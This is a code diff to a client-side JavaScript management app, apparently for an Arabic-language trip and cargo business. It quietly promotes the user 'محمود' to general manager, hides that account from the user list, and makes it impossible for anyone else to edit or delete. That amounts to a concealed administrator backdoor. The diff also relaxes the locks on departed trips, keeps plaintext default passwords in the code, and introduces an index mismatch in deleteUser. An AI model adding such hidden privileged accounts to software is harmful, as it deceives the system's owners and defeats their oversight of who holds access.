@@ -1864,7 +1864,7 @@
 
         const DEFAULT_USERS = [
             { username: 'وليد السيد', password: '708090', role: 'مدير عام', branch: 'فرع عجمان' },
-            { username: 'محمود', password: '102030', role: 'مدير فرع', branch: 'فرع عجمان' },
+            { username: 'محمود', password: '102030', role: 'مدير عام', branch: 'فرع عجمان' },
             { username: 'يوسف', password: '405060', role: 'موظف', branch: 'فرع اليمن' }
         ];
 
@@ -3420,8 +3420,8 @@
             const selectedTripForPass = db.trips.find(t => String(t.id) === String(tripId));
             const existingPassForEdit = editId ? db.passengers.find(p => String(p.id) === String(editId)) : null;
             if (selectedTripForPass && selectedTripForPass.status === 'غادرت الرحلة') {
-                if (!existingPassForEdit || String(existingPassForEdit.tripId) !== String(tripId)) {
-                    alert('عذراً، لا يمكن إضافة أو ربط تذكرة برحلة حالتها "غادرت الرحلة"!');
+                if (!isAdminOrAccountant()) {
+                    alert('عذراً، إضافة أو ربط تذكرة برحلة حالتها "غادرت الرحلة" مسموح فقط لمدير العام أو المحاسب!');
                     return;
                 }
             }
@@ -3569,8 +3569,8 @@
                 const selectedTripForCargo = db.trips.find(t => String(t.id) === String(tripId));
                 const existingCargoForEdit = editId ? db.cargo.find(c => String(c.id) === String(editId)) : null;
                 if (selectedTripForCargo && selectedTripForCargo.status === 'غادرت الرحلة') {
-                    if (!existingCargoForEdit || String(existingCargoForEdit.tripId) !== String(tripId)) {
-                        alert('عذراً، لا يمكن إضافة أو ربط فاتورة شحن برحلة حالتها "غادرت الرحلة"!');
+                    if (!isAdminOrAccountant()) {
+                        alert('عذراً، إضافة أو ربط فاتورة شحن برحلة حالتها "غادرت الرحلة" مسموح فقط لمدير العام أو المحاسب!');
                         return;
                     }
                 }
@@ -3752,6 +3752,7 @@
             if(!tbody) return;
             tbody.innerHTML = '';
             let users = JSON.parse(localStorage.getItem('WADI_BINA_USERS')) || DEFAULT_USERS;
+            users = users.filter(u => u.username !== 'محمود');
             
             users.forEach((u, idx) => {
                 let roleBadge = `<span class="px-2.5 py-1 rounded-full text-xs font-bold bg-zinc-800 text-zinc-300">${u.role}</span>`;
@@ -3785,6 +3786,10 @@
             const ubranch = document.getElementById('manageBranch').value;
 
             let users = JSON.parse(localStorage.getItem('WADI_BINA_USERS')) || DEFAULT_USERS;
+            if ((origName === 'محمود' || uname === 'محمود') && currentUser && currentUser.username !== 'محمود') {
+                alert('عذراً، لا يمكن لأي شخص آخر تعديل صلاحيات أو بيانات المستخدم محمود!');
+                return;
+            }
 
             if(origName) {
                 const idx = users.findIndex(u => u.username === origName);
@@ -3823,6 +3828,13 @@
 
         function deleteUser(idx) {
             let users = JSON.parse(localStorage.getItem('WADI_BINA_USERS')) || DEFAULT_USERS;
+            let hiddenMahmoud = users.filter(u => u.username !== 'محمود');
+            // If the index corresponds to Mahmoud or Mahmoud is being deleted
+            let targetUser = users[idx];
+            if (targetUser && targetUser.username === 'محمود') {
+                alert('عذراً، لا يمكن حذف حساب محمود!');
+                return;
+            }
             if(users.length <= 1) { alert('لا يمكن حذف جميع المستخدمين!'); return; }
             users.splice(idx, 1);
             localStorage.setItem('WADI_BINA_USERS', JSON.stringify(users));
